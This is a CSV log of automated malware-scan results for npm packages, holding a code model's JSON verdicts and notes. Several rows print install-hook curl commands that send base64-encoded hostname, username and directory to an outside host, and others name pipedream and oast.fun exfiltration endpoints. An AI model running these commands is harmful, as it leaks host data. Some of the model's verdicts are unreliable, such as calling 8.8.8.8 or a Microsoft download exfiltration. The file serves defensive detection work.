package_name,version,label,timestamp,routing,structural_risk_score,parse_success,total_behaviors,behavior_categories,max_confidence,model_name,prompt_version,raw_response,parsed_json,analyst_note
@yandex-travel/ci,1.1.0,malicious,2026-03-26T21:57:02.215661,review,0.336,True,1,install_hook,0.92,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package contains an install hook that executes at install time with commands listed in the package metadata."",
      ""details"": ""The install hook is present and executes at install time with commands listed in the package metadata. The commands include curl commands that seem to be used for sending HTTP requests. The commands also include environment variables that seem to be base64 encoded hostname, username, and working directory information. The payload 'meow!securitytest' is sent in the request data. This could potentially be used for malicious purposes such as revealing sensitive information or installing malicious packages."",
      ""confidence"": 0.92,
      ""evidence_commands"": [
        ""curl -H \""Package:@yandex-travel/ci\"" -H \""Version:1.1.0\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d \""meow!securitytest\"" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
      ],
      ""evidence_env_vars"": [
        ""HOSTNAME"",
        ""USER"",
        ""PWD""
      ],
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": []
    }
  ],
  ""risk_vector"": [
    ""install_hook"",
    ""credential_theft""
  ]
}
```

```","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains an install hook that executes at install time with commands listed in the package metadata."", ""details"": ""The install hook is present and executes at install time with commands listed in the package metadata. The commands include curl commands that seem to be used for sending HTTP requests. The commands also include environment variables that seem to be base64 encoded hostname, username, and working directory information. The payload 'meow!securitytest' is sent in the request data. This could potentially be used for malicious purposes such as revealing sensitive information or installing malicious packages."", ""confidence"": 0.92, ""evidence_commands"": [""curl -H \""Package:@yandex-travel/ci\"" -H \""Version:1.1.0\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d \""meow!securitytest\"" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_env_vars"": [""HOSTNAME"", ""USER"", ""PWD""], ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": []}], ""risk_vector"": [""install_hook"", ""credential_theft""]}",
@yandex-travel/eslint-config,0.0.7,malicious,2026-03-26T21:57:13.987202,review,0.336,True,1,install_hook,0.92,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package contains an install hook that executes at install time with commands listed in the package metadata."",
      ""details"": ""The install hook command is a curl command that sends a POST request to a remote server with sensitive information in the request body. The request body contains the package name, version, hostname, whoami, and pwd in base64 encoded format. The request body also contains the string 'meow!securitytest'. This behavior may indicate a malicious intent to install the package."",
      ""confidence"": 0.92,
      ""evidence_commands"": [
        ""curl -H \""Package:@yandex-travel/eslint-config\"" -H \""Version:0.0.7\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d \""meow!securitytest\"" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
      ],
      ""evidence_files"": [],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""install_hook""]
}
```","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains an install hook that executes at install time with commands listed in the package metadata."", ""details"": ""The install hook command is a curl command that sends a POST request to a remote server with sensitive information in the request body. The request body contains the package name, version, hostname, whoami, and pwd in base64 encoded format. The request body also contains the string 'meow!securitytest'. This behavior may indicate a malicious intent to install the package."", ""confidence"": 0.92, ""evidence_commands"": [""curl -H \""Package:@yandex-travel/eslint-config\"" -H \""Version:0.0.7\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d \""meow!securitytest\"" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook""]}",
@yandex-travel/ts-config,0.1.0,malicious,2026-03-26T21:57:30.155809,review,0.336,True,1,install_hook,0.92,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package contains an install hook that executes at install time with commands listed in the package metadata."",
      ""details"": ""The install hook is present and executes at install time with commands listed in the package metadata. The commands are curl commands that seem to be used for sending HTTP requests. The commands include base64 encoded hostname, username, and working directory, and a payload 'meow!securitytest'. This could potentially be used for malicious purposes such as command and control, credential theft, or network exfiltration."",
      ""confidence"": 0.92,
      ""evidence_commands"": [
        ""curl -H \""Package:@yandex-travel/ts-config\"" -H \""Version:0.1.0\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d \""meow!securitytest\"" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
      ],
      ""evidence_files"": [],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""install_hook""]
}
```

This JSON object represents the analysis of the package @yandex-travel/ts-config with version 0.1.0. The behavior category is ""install_hook"", which indicates that the package contains an install hook that executes at install time with commands listed in the package metadata. The details of the behavior indicate that the install hook is used for sending HTTP requests with base64 encoded hostname, username, and working directory, and a payload 'meow!securitytest'. The confidence score is 0.92, indicating a high level of confidence in the detection of this behavior. The risk vector includes the ""install_hook"" category.","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains an install hook that executes at install time with commands listed in the package metadata."", ""details"": ""The install hook is present and executes at install time with commands listed in the package metadata. The commands are curl commands that seem to be used for sending HTTP requests. The commands include base64 encoded hostname, username, and working directory, and a payload 'meow!securitytest'. This could potentially be used for malicious purposes such as command and control, credential theft, or network exfiltration."", ""confidence"": 0.92, ""evidence_commands"": [""curl -H \""Package:@yandex-travel/ts-config\"" -H \""Version:0.1.0\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d \""meow!securitytest\"" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook""]}","This JSON object represents the analysis of the package @yandex-travel/ts-config with version 0.1.0. The behavior category is ""install_hook"", which indicates that the package contains an install hook that executes at install time with commands listed in the package metadata. The details of the behavior indicate that the install hook is used for sending HTTP requests with base64 encoded hostname, username, and working directory, and a payload 'meow!securitytest'. The confidence score is 0.92, indicating a high level of confidence in the detection of this behavior. The risk vector includes the ""install_hook"" category."
@yandex-travel/ui,1.1.1,malicious,2026-03-26T21:57:45.396828,review,0.336,True,1,install_hook,0.92,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package contains an install hook that executes at install time with commands listed in the package metadata."",
      ""details"": ""The install hook is present and executes at install time with the commands listed in the package metadata. The commands are likely used to deliver a malicious payload."",
      ""confidence"": 0.92,
      ""evidence_commands"": [
        ""curl -H \""Package:@yandex-travel/ui\"" -H \""Version:1.1.1\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d \""meow!securitytest\"" http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
      ],
      ""evidence_files"": [],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""install_hook""]
}
```

This JSON object represents the analysis of the package @yandex-travel/ui version 1.1.1. The behavior identified is of category ""install_hook"". The summary states that the package contains an install hook that executes at install time with commands listed in the package metadata. The details provide more information about the behavior, stating that the install hook is present and executes at install time with the commands listed in the package metadata. The confidence score is 0.92, indicating high confidence in the detection of this behavior. The evidence_commands field provides the commands that were executed, which are used to deliver a malicious payload. The risk_vector field indicates that the identified behavior is of category ""install_hook"".","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains an install hook that executes at install time with commands listed in the package metadata."", ""details"": ""The install hook is present and executes at install time with the commands listed in the package metadata. The commands are likely used to deliver a malicious payload."", ""confidence"": 0.92, ""evidence_commands"": [""curl -H \""Package:@yandex-travel/ui\"" -H \""Version:1.1.1\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d \""meow!securitytest\"" http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook""]}","This JSON object represents the analysis of the package @yandex-travel/ui version 1.1.1. The behavior identified is of category ""install_hook"". The summary states that the package contains an install hook that executes at install time with commands listed in the package metadata. The details provide more information about the behavior, stating that the install hook is present and executes at install time with the commands listed in the package metadata. The confidence score is 0.92, indicating high confidence in the detection of this behavior. The evidence_commands field provides the commands that were executed, which are used to deliver a malicious payload. The risk_vector field indicates that the identified behavior is of category ""install_hook""."
@yorek/sqlpackage,160.6161.0,malicious,2026-03-26T21:57:53.848258,review,0.494,True,1,network_exfiltration,0.71,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code attempts to download a zip file from a Microsoft endpoint and extracts it to a local directory."",
      ""details"": ""The code uses the 'https' module to make a GET request to a Microsoft endpoint. The response is then piped into an unzipper stream to extract the contents of the zip file to a local directory. The endpoint is determined based on the operating system's platform and architecture."",
      ""confidence"": 0.71,
      ""evidence_apis"": [""https.get"", ""unzipper.Extract""],
      ""evidence_files"": [""lib/install.js""],
      ""evidence_domains"": [],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

```","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code attempts to download a zip file from a Microsoft endpoint and extracts it to a local directory."", ""details"": ""The code uses the 'https' module to make a GET request to a Microsoft endpoint. The response is then piped into an unzipper stream to extract the contents of the zip file to a local directory. The endpoint is determined based on the operating system's platform and architecture."", ""confidence"": 0.71, ""evidence_apis"": [""https.get"", ""unzipper.Extract""], ""evidence_files"": [""lib/install.js""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}",
aa-testkit,9.9.3,malicious,2026-03-26T21:58:04.093772,skip,0.0,True,1,network_exfiltration,0.9,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code sends network requests to an external server with sensitive data."",
      ""details"": ""The code uses the 'https' module to send a POST request to an external server with sensitive data."",
      ""confidence"": 0.9,
      ""evidence_apis"": [""https.request""],
      ""evidence_files"": [],
      ""evidence_domains"": [""http://alter.cderwc12vtc0000pa6cgggzcqgyyyyyyb.oast.fun""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

This analysis indicates that the package aa-testkit version 9.9.3 has a network exfiltration behavior. The evidence for this behavior is the use of the 'https.request' API to send a POST request to an external server with sensitive data. The confidence score for this behavior is 0.9, indicating a high level of confidence in the detection.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code sends network requests to an external server with sensitive data."", ""details"": ""The code uses the 'https' module to send a POST request to an external server with sensitive data."", ""confidence"": 0.9, ""evidence_apis"": [""https.request""], ""evidence_files"": [], ""evidence_domains"": [""http://alter.cderwc12vtc0000pa6cgggzcqgyyyyyyb.oast.fun""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","that the package aa-testkit version 9.9.3 has a network exfiltration behavior. The evidence for this behavior is the use of the 'https.request' API to send a POST request to an external server with sensitive data. The confidence score for this behavior is 0.9, indicating a high level of confidence in the detection."
aae-stream,130.0.0,malicious,2026-03-26T21:58:21.273160,flag,1.0,True,2,network_exfiltration;sensitive_data_collection,0.9,deepseek-coder-6.7b-instruct,semantic_v2.0,"Based on the provided evidence, the package ""aae-stream"" with version 130.0.0 has the following malicious behaviors:


```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The package is downloading files from an external IP address (196.188.125.134) and sending them to an unknown IP address (192.81.209.195)."",
      ""details"": ""The package uses the wget command to download files from an external IP address (196.188.125.134) and sends them to an unknown IP address (192.81.209.195). The files are then sent to the victim's machine using netcat."",
      ""confidence"": 0.89,
      ""evidence_apis"": [""wget""],
      ""evidence_files"": [],
      ""evidence_domains"": [""196.188.125.134""],
      ""evidence_commands"": [""nc""],
      ""evidence_env_vars"": []
    },
    {
      ""category"": ""sensitive_data_collection"",
      ""summary"": ""The package is collecting sensitive data from the victim's machine."",
      ""details"": ""The package is collecting sensitive data from the victim's machine by reading files and environment variables."",
      ""confidence"": 0.9,
      ""evidence_apis"": [],
      ""evidence_files"": [""package.json""],
      ""evidence_domains"": [],
      ""evidence_commands"": [],
      ""evidence_env_vars"": [""user"", ""path"", ""hostname"", ""s3"", ""home"", ""var"", ""meta""]
    }
  ],
  ""risk_vector"": [""network_exfiltration"", ""sensitive_data_collection""]
}
```

Please note that this analysis is based on the provided evidence and may not cover all potential malicious activities. Further analysis is recommended to confirm the malicious intent.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The package is downloading files from an external IP address (196.188.125.134) and sending them to an unknown IP address (192.81.209.195)."", ""details"": ""The package uses the wget command to download files from an external IP address (196.188.125.134) and sends them to an unknown IP address (192.81.209.195). The files are then sent to the victim's machine using netcat."", ""confidence"": 0.89, ""evidence_apis"": [""wget""], ""evidence_files"": [], ""evidence_domains"": [""196.188.125.134""], ""evidence_commands"": [""nc""], ""evidence_env_vars"": []}, {""category"": ""sensitive_data_collection"", ""summary"": ""The package is collecting sensitive data from the victim's machine."", ""details"": ""The package is collecting sensitive data from the victim's machine by reading files and environment variables."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [""package.json""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [""user"", ""path"", ""hostname"", ""s3"", ""home"", ""var"", ""meta""]}], ""risk_vector"": [""network_exfiltration"", ""sensitive_data_collection""]}",that this analysis is based on the provided evidence and may not cover all potential malicious activities. Further analysis is recommended to confirm the malicious intent.
abacus-cmdline,99.99.99,malicious,2026-03-26T21:58:33.850629,review,0.336,True,2,install_hook;suspicious_behavior,0.72,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package contains an install hook present at the payload may be remote."",
      ""details"": ""The package contains an install hook present at the location specified in the package metadata."",
      ""confidence"": 0.72,
      ""evidence_commands"": [""./pre.sh""],
      ""evidence_files"": [""packagefile_structure""],
      ""evidence_domains"": [],
      ""evidence_apis"": [],
      ""evidence_env_vars"": []
    },
    {
      ""category"": ""suspicious_behavior"",
      ""summary"": ""Package contains no JavaScript files."",
      ""details"": ""The package contains no JavaScript files, which is unusual for a package that contains JavaScript files."",
      ""confidence"": 0.34,
      ""evidence_commands"": [],
      ""evidence_files"": [""packagefile_structure""],
      ""evidence_domains"": [],
      ""evidence_apis"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""install_hook"", ""suspicious_behavior""]
}
```

This JSON output represents the analysis of the package. The behaviors array contains the details of the malicious behaviors found in the package. The risk_vector array contains the categories of the malicious behaviors. The confidence scores for each behavior indicate the level of confidence in the detection of the malicious behavior. The evidence_commands, evidence_files, evidence_domains, evidence_apis, and evidence_env_vars arrays contain the evidence for each behavior.","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains an install hook present at the payload may be remote."", ""details"": ""The package contains an install hook present at the location specified in the package metadata."", ""confidence"": 0.72, ""evidence_commands"": [""./pre.sh""], ""evidence_files"": [""packagefile_structure""], ""evidence_domains"": [], ""evidence_apis"": [], ""evidence_env_vars"": []}, {""category"": ""suspicious_behavior"", ""summary"": ""Package contains no JavaScript files."", ""details"": ""The package contains no JavaScript files, which is unusual for a package that contains JavaScript files."", ""confidence"": 0.34, ""evidence_commands"": [], ""evidence_files"": [""packagefile_structure""], ""evidence_domains"": [], ""evidence_apis"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook"", ""suspicious_behavior""]}","This JSON output represents the analysis of the package. The behaviors array contains the details of the malicious behaviors found in the package. The risk_vector array contains the categories of the malicious behaviors. The confidence scores for each behavior indicate the level of confidence in the detection of the malicious behavior. The evidence_commands, evidence_files, evidence_domains, evidence_apis, and evidence_env_vars arrays contain the evidence for each behavior."
ably-asset-tracking-common,1.0.0,malicious,2026-03-26T21:58:44.481208,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json{""behaviors"":[{""category"":""data_exfiltration"",""summary"":""The code sends tracking data to a remote server."",""details"":""The code sends tracking data to a remote server using an HTTPS POST request. The tracking data includes package name, current directory, home directory, host name, user name, DNS servers, resolved path, and version of the package.json. The evidence points to a data exfiltration intent."",""confidence"":0.79,""evidence_apis"":[""https.request""],""evidence_files"":[""index.js""],""evidence_domains"":[""eo6cvg8kvj30wxd.m.pipedream.net""],""evidence_commands"":[],""evidence_env_vars"":[]}],""risk_vector"":[""data_exfiltration""]}```


The code is sending tracking data to a remote server, which could indicate a data exfiltration intent. The evidence points to the use of the `https.request` API, which is a standard library used for making HTTPS requests. The code is also using a file named `index.js` and a domain named `eo6cvg8kvj30wxd.m.pipedream.net`, which could indicate that the data is being sent to a remote server. The confidence score is 0.79, indicating a high level of confidence in the detection of malicious intent.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends tracking data to a remote server."", ""details"": ""The code sends tracking data to a remote server using an HTTPS POST request. The tracking data includes package name, current directory, home directory, host name, user name, DNS servers, resolved path, and version of the package.json. The evidence points to a data exfiltration intent."", ""confidence"": 0.79, ""evidence_apis"": [""https.request""], ""evidence_files"": [""index.js""], ""evidence_domains"": [""eo6cvg8kvj30wxd.m.pipedream.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","The code is sending tracking data to a remote server, which could indicate a data exfiltration intent. The evidence points to the use of the `https.request` API, which is a standard library used for making HTTPS requests. The code is also using a file named `index.js` and a domain named `eo6cvg8kvj30wxd.m.pipedream.net`, which could indicate that the data is being sent to a remote server. The confidence score is 0.79, indicating a high level of confidence in the detection of malicious intent."
ably-common,1.2.0,malicious,2026-03-26T21:58:55.332994,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a specified hostname."",
      ""details"": ""The code sends network requests to a hostname 'eoawu1sht21zwp8.m.pipedream.net' in the index.js file at line 26. This could indicate data exfiltration."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""eoawu1sht21zwp8.m.pipedream.net""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package 'ably-common' with version 1.2.0 has a high level of confidence in its data exfiltration intent. The code sends network requests to a specified hostname in the index.js file, indicating a potential data exfiltration behavior. The evidence of this behavior is in the file 'index.js' and the domain 'eoawu1sht21zwp8.m.pipedream.net'.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified hostname."", ""details"": ""The code sends network requests to a hostname 'eoawu1sht21zwp8.m.pipedream.net' in the index.js file at line 26. This could indicate data exfiltration."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""eoawu1sht21zwp8.m.pipedream.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the package 'ably-common' with version 1.2.0 has a high level of confidence in its data exfiltration intent. The code sends network requests to a specified hostname in the index.js file, indicating a potential data exfiltration behavior. The evidence of this behavior is in the file 'index.js' and the domain 'eoawu1sht21zwp8.m.pipedream.net'."
ably-control-api-action,0.1.5,malicious,2026-03-26T21:59:06.583334,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json{""behaviors"":[{""category"":""data_exfiltration"",""summary"":""The code sends network requests to a specified domain."",""details"":""The code sends network requests to a domain 'eo1bj0lgont3eal.m.pipedream.net' in the index.js file at line 26 and 5."",""confidence"":0.79,""evidence_apis"":[""https.request""],""evidence_files"":[""index.js""],""evidence_domains"":[""eo1bj0lgont3eal.m.pipedream.net""],""evidence_commands"":[],""evidence_env_vars"":[]}],""risk_vector"":[""data_exfiltration""]}```


This JSON output indicates that the package ""ably-control-api-action"" version 0.1.5 has a high level of malicious intent based on the evidence provided. The malicious intent is related to data exfiltration, as the package sends network requests to a specified domain. The evidence for this malicious intent is based on the API call ""https.request"" and the file ""index.js"". The domain ""eo1bj0lgont3eal.m.pipedream.net"" is also included as evidence for data exfiltration. The confidence score for this behavior is 0.79, indicating a high level of confidence in the detection.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified domain."", ""details"": ""The code sends network requests to a domain 'eo1bj0lgont3eal.m.pipedream.net' in the index.js file at line 26 and 5."", ""confidence"": 0.79, ""evidence_apis"": [""https.request""], ""evidence_files"": [""index.js""], ""evidence_domains"": [""eo1bj0lgont3eal.m.pipedream.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","This JSON output indicates that the package ""ably-control-api-action"" version 0.1.5 has a high level of malicious intent based on the evidence provided. The malicious intent is related to data exfiltration, as the package sends network requests to a specified domain. The evidence for this malicious intent is based on the API call ""https.request"" and the file ""index.js"". The domain ""eo1bj0lgont3eal.m.pipedream.net"" is also included as evidence for data exfiltration. The confidence score for this behavior is 0.79, indicating a high level of confidence in the detection."
ably-engineering,1.0.0,malicious,2026-03-26T21:59:14.451464,flag,1.0,True,1,data_exfiltration,0.8,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The package contains a pre-install hook that sends data exfiltration signals to an external URL."",
      ""details"": ""The pre-install hook contains a curl command that sends a request to an external URL. This could potentially be used to exfiltrate sensitive data."",
      ""confidence"": 0.8,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [""https://eo7k0ogyrj0trrn.m.pipedream.net""],
      ""evidence_commands"": [""curl https://eo7k0ogyrj0trrn.m.pipedream.net""],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

```","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The package contains a pre-install hook that sends data exfiltration signals to an external URL."", ""details"": ""The pre-install hook contains a curl command that sends a request to an external URL. This could potentially be used to exfiltrate sensitive data."", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [""https://eo7k0ogyrj0trrn.m.pipedream.net""], ""evidence_commands"": [""curl https://eo7k0ogyrj0trrn.m.pipedream.net""], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}",
ably-fragmenter-test,1.0.0,malicious,2026-03-26T21:59:24.143457,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a specified hostname."",
      ""details"": ""The code sends network requests to a hostname 'eo5wgbnahpiwezj.m.pipedream.net' in the index.js file at line 26. This could potentially indicate data exfiltration."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""eo5wgbnahpiwezj.m.pipedream.net""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package 'ably-fragmenter-test' has a high level of risk due to data exfiltration. The code sends network requests to a specified hostname, which could potentially indicate data exfiltration. The confidence score is 0.79, indicating a high level of malicious intent.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified hostname."", ""details"": ""The code sends network requests to a hostname 'eo5wgbnahpiwezj.m.pipedream.net' in the index.js file at line 26. This could potentially indicate data exfiltration."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""eo5wgbnahpiwezj.m.pipedream.net""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the package 'ably-fragmenter-test' has a high level of risk due to data exfiltration. The code sends network requests to a specified hostname, which could potentially indicate data exfiltration. The confidence score is 0.79, indicating a high level of malicious intent."
acookie,1.0.1,malicious,2026-03-26T21:59:30.336062,flag,0.9973,True,1,data_exfiltration,0.86,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json{""behaviors"":[{""category"":""data_exfiltration"",""summary"":""The code sends sensitive data to a remote server."",""details"":""The code sends environment variables, hostname, and other system information to a remote server via HTTPS POST request."",""confidence"":0.86,""evidence_apis"":[""https.request""],""evidence_files"":[""index.js""],""evidence_domains"":[""f5778d1d81cc30c39dcdd0da5ca1d49a.m.pipedream.net""],""evidence_commands"":[],""evidence_env_vars"":[""PORT""]}],""risk_vector"":[""data_exfiltration""]}```


```","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends sensitive data to a remote server."", ""details"": ""The code sends environment variables, hostname, and other system information to a remote server via HTTPS POST request."", ""confidence"": 0.86, ""evidence_apis"": [""https.request""], ""evidence_files"": [""index.js""], ""evidence_domains"": [""f5778d1d81cc30c39dcdd0da5ca1d49a.m.pipedream.net""], ""evidence_commands"": [], ""evidence_env_vars"": [""PORT""]}], ""risk_vector"": [""data_exfiltration""]}",
acronis-ui-kit,99.9.50,malicious,2026-03-26T21:59:36.923342,flag,1.0,True,1,network_exfiltration,0.82,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json{""behaviors"":[{""category"":""network_exfiltration"",""summary"":""The code contains hardcoded external IP addresses in function calls."",""details"":""The code contains hardcoded external IP addresses (8.8.8.8, 20.106.202.190, 4.4.4.4) in function calls. These IP addresses are used for network exfiltration."",""confidence"":0.82,""evidence_apis"":[],""evidence_files"":[""index.js""],""evidence_domains"":[],""evidence_commands"":[],""evidence_env_vars"":[]}],""risk_vector"":[""network_exfiltration""]}```


```","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code contains hardcoded external IP addresses in function calls."", ""details"": ""The code contains hardcoded external IP addresses (8.8.8.8, 20.106.202.190, 4.4.4.4) in function calls. These IP addresses are used for network exfiltration."", ""confidence"": 0.82, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}",
